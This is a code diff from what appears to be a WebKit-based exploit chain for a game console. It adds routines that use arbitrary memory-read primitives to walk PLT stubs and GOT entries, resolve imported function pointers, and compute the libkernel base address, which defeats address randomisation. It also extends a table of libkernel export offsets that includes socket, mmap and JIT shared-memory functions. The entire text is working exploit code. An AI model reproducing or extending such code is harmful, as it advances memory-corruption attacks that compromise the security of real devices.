@@ -950,9 +950,14 @@ function lkFromFnPtrPsfree(p, fnPtr, off, pltRva, webkitBase) {
 
     const entryB0 = read1p(p, fnPtr);
     if (entryB0 === 0xb8) {
+        const zeroHits = calcLkFromFnPtrZeroRead(fnPtr, off);
+        if (zeroHits.length)
+            return { lk: zeroHits[0].lk, iatRva: pltRva, via: zeroHits[0].via, fnPtr };
         const errs = kErrorCandidates(off);
         for (let i = 0; i < errs.length; i++) {
             const lk = fnPtr.sub32(errs[i]);
+            if (lkBaseTag(off) != null && looksLikeLkBase(lk, off))
+                return { lk, iatRva: pltRva, via: "error+" + errs[i].toString(16), fnPtr };
             if (lkAligned(lk) && isLibkernelPrologue(p, lk))
                 return { lk, iatRva: pltRva, via: "error+" + errs[i].toString(16), fnPtr };
         }
@@ -1998,7 +2003,7 @@ export function probeLibkernelGuesses(p, webkitBase, nativeFn, log) {
     return showLibkernelGuesses(webkitBase, nativeFn, log);
 }
 
-/** Suchi libkernel export RVAs from offset table — for fnPtr−RVA base calc. */
+/** 13.52 libkernel export RVAs — allowlist only (no k_getpid_syscall / kernel keys). */
 const LK_RVA_PRI = {
     k_usleep: 0,
     k__error: 1,
@@ -2007,23 +2012,29 @@ const LK_RVA_PRI = {
     k_write: 4,
     k_close: 5,
     k_stat: 6,
-    k_notify: 7,
-    k_socket: 8,
-    k_connect: 9,
-    k_mmap: 10,
+    k_pread: 7,
+    k_pwrite: 8,
+    k_lseek: 9,
+    k_unlink: 10,
+    k_notify: 11,
+    k_socket: 12,
+    k_connect: 13,
+    k_connect_alt: 14,
+    k_mmap: 15,
+    k_jitshm_create: 16,
+    k_jitshm_alias: 17,
 };
 
 export function libkernelRvaTable(off) {
     off = off || {};
     const out = [];
-    for (const key of Object.keys(off)) {
-        if (!key.startsWith("k_") || key === "k_stubs") continue;
+    for (const key of Object.keys(LK_RVA_PRI)) {
         const rva = off[key];
         if (typeof rva !== "number" || rva <= 0) continue;
         out.push({
             key,
             rva,
-            pri: LK_RVA_PRI[key] != null ? LK_RVA_PRI[key] : 40,
+            pri: LK_RVA_PRI[key],
         });
     }
     out.sort(function (a, b) {
@@ -2076,6 +2087,67 @@ export function calcLkFromFnPtrZeroRead(fnPtr, off) {
 export function calcLkBestFromFnPtr(fnPtr, off) {
     const cands = calcLkFromFnPtrZeroRead(fnPtr, off);
     return cands.length ? cands[0] : null;
+}
+
+const SS_PLT_ONE_IDX = "wk-plt-one-idx";
+
+/**
+ * One low .text PLT try — reads webkit GOT only, lk = fn−RVA (0 reads @ lk).
+ * Tap again to cycle PLT candidates (NOT a scan — one stub per tap).
+ */
+export function resolveLkOnePltStep(p, webkitBase, off, opts) {
+    opts = opts || {};
+    if (!p || !webkitBase) return { ok: false, error: "need p + webkitBase" };
+    const cands = importPltCandidates(off, POOPS_SCAN_LO);
+    if (!cands.length) return { ok: false, error: "no plt list" };
+    let idx = 0;
+    try { idx = parseInt(sessionStorage.getItem(SS_PLT_ONE_IDX) || "0", 10) || 0; } catch (_) { }
+    idx = ((idx % cands.length) + cands.length) % cands.length;
+    const pltRva = cands[idx];
+    if (opts.advance !== false) {
+        try { sessionStorage.setItem(SS_PLT_ONE_IDX, String((idx + 1) % cands.length)); } catch (_) { }
+    }
+    const base = moduleLoadBase(p, webkitBase);
+    const stub = base.add32(pltRva);
+    const op = read2p(p, stub);
+    if (op !== 0x25ff && op !== 0x15ff)
+        return { ok: false, pltRva, idx, total: cands.length, error: "not plt op=" + (op != null ? op.toString(16) : "null") };
+    const disp = s32(read4p(p, stub.add32(2)));
+    if (disp == null)
+        return { ok: false, pltRva, idx, total: cands.length, error: "disp read fail" };
+    const raw = read8p(p, stub.add32(6 + disp));
+    if (!raw || raw.hi < 0x8)
+        return { ok: false, pltRva, idx, total: cands.length, error: "got slot empty" };
+    const fn = resolveImportPtr(p, base, off, raw, 0);
+    if (!fn)
+        return { ok: false, pltRva, idx, total: cands.length, error: "import resolve fail", raw: String(raw) };
+    const hits = calcLkFromFnPtrZeroRead(fn, off);
+    if (hits.length) {
+        return {
+            ok: true, lk: hits[0].lk, pltRva, idx, total: cands.length,
+            fnPtr: fn, via: hits[0].via,
+        };
+    }
+    if (off.k_usleep != null) {
+        const lkUs = fn.sub32(off.k_usleep);
+        if (looksLikeLkBase(lkUs, off))
+            return {
+                ok: true, lk: lkUs, pltRva, idx, total: cands.length,
+                fnPtr: fn, via: "usleep-" + off.k_usleep.toString(16),
+            };
+    }
+    if (off.k__error != null) {
+        const lk = fn.sub32(off.k__error);
+        if (looksLikeLkBase(lk, off))
+            return {
+                ok: true, lk, pltRva, idx, total: cands.length,
+                fnPtr: fn, via: "error-" + off.k__error.toString(16),
+            };
+    }
+    return {
+        ok: false, pltRva, idx, total: cands.length,
+        fnPtr: fn, error: "fn−RVA miss (not …c30)",
+    };
 }
 
 /** Accept lk from Suchi RVA math / …c30 tag — 0 reads (peek @ lk OOMs on poops). */
